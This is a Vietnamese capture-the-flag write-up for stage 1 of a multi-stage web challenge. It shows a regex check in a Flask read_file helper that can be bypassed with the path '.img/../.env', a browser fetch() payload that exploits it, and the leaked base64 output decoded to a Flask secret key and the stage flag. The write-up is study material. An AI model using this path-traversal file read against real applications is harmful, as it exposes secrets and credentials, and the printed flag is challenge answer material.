![image](https://github.com/user-attachments/assets/9d121b3c-743a-4f4a-b353-6576c0b186e3)

# **ANALYZE**

Và theo mô tả thì đây chính là 1 bài web được lồng ghép 5 vuln vào tương ứng với 5 Stage Flag , ta sẽ phải giải từng lvl để có được manh mối để có thể giải lvl tiếp theo.

![image](https://github.com/user-attachments/assets/63edad89-3512-4ec7-a1c1-fbf79e1cae2b)

Đầu tiên khi truy cập trang web của chall , thì nó chỉ là 1 form đăng nhập , bây h chúng ta sẽ đăng nhập vào bằng 1 tài khoản bất kì.

Thì đây chính là 1 trang blog dùng để đăng tải bài viết 

![image](https://github.com/user-attachments/assets/830ef06a-fe82-4895-8935-5e4ab263107c)

Tiếp đến ta sẽ đi phần phân tích trong Source code mà chall cung cấp cho chúng ta

Trong file `set_up.py` đã cung cấp cho ta thông tin rằng là , FLAG_STAGE_1 và FLASK_APP_SECRET_KEY được giấu trong .env

```
import os
from uuid import uuid4

FLAG_STAGE_1 = os.environ.get("FLAG_STAGE_1")
FLAG_STAGE_5 = os.environ.get("FLAG_STAGE_5")

with open(".env", "w") as f:
    f.write(f"FLASK_APP_SECRET_KEY={os.urandom(50).hex()}\n")
    f.write(f"FLAG_STAGE_1={FLAG_STAGE_1}\n")

with open(f"flag_{uuid4().hex + uuid4().hex + uuid4().hex}.txt", "w") as f:
    f.write(FLAG_STAGE_5)
```

Và bên trong file `main.py` có 1 hàm `read_file` vô cùng nguy hiểm 

```
def read_file(path):
    # Prevent reading files outside the allowed directory (.img/).
    if not re.search(r'^\.\w+.*$', str(os.path.relpath(path))):
        return ""

    try:
        with open(path, 'rb') as f:
            content = f.read()
            base64_content = base64.b64encode(content).decode('utf-8')
            return base64_content
    except Exception:
        return ""
```

Regex r'^\.\w+.*$' tưởng như giới hạn chỉ đọc .img/, nhưng thực tế:

.env → hợp lệ (vì bắt đầu bằng dấu . và tiếp theo là chữ cái).

os.path.relpath(path) với path=".env" vẫn là .env.

→  ta có thể đọc file .env thông qua hàm read_file() nếu ta có thể điều khiển biến path

Và dữ liệu được trả về sẽ được mã hóa dạng base64.

# **EXPLOIT**

Vậy nên payload đẻ giải STAGE_1 sẽ là :

Và ta sẽ ném nó vào console

```
fetch('/note/new', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
  },
  body: new URLSearchParams({
    'title': 'leak',
    'content': 'read .env',
    'image_path': '.img/../.env'
  })
}).then(res => res.text()).then(t => console.log(t))
```

Sau khi ta ném payload này lên thì nó sẽ trở thành : 

```
<img src="data:image/png;base64,{{ note.image_path | read_file }}">
```
→ read_file('.img/../.env') được gọi
→ os.path.relpath('.img/../.env') → '.env'
→ File .env được mở
→ Nội dung được base64.encode
→ Trả về trình duyệt trong HTML
→ Flag lộ ra ở thẻ <img> hoặc source HTML.

![image](https://github.com/user-attachments/assets/e03a2212-187e-4224-9e1d-535a69f5e689)


```
src="data:image/png;base64, RkxBU0tfQVBQX1NFQ1JFVF9LRVk9OWYzMTBkNzVjODRjMWFiYTY1ZmE4N2ZlYzg5ODBmN2M0M2I1NWRkMjc0YjQxZTM1MTI3Nzc5ODFjYTM3ZWExZDYwNmU2MjZjMjQyNDhhMGQzOTk1N2MyYmI5NGM5NDkzZjQxMApGTEFHX1NUQUdFXzE9R1BOQ1RGe2pVNXRfMWU0a180MWxfVGhlX1RISU42U30K" alt="">
```

![image](https://github.com/user-attachments/assets/1322a3ca-9d50-4963-b8b9-2831873c51e3)


# **FLAG**
```
FLASK_APP_SECRET_KEY=9f310d75c84c1aba65fa87fec8980f7c43b55dd274b41e3512777981ca37ea1d606e626c24248a0d39957c2bb94c9493f410
FLAG_STAGE_1=GPNCTF{jU5t_1e4k_41l_The_THIN6S}
```

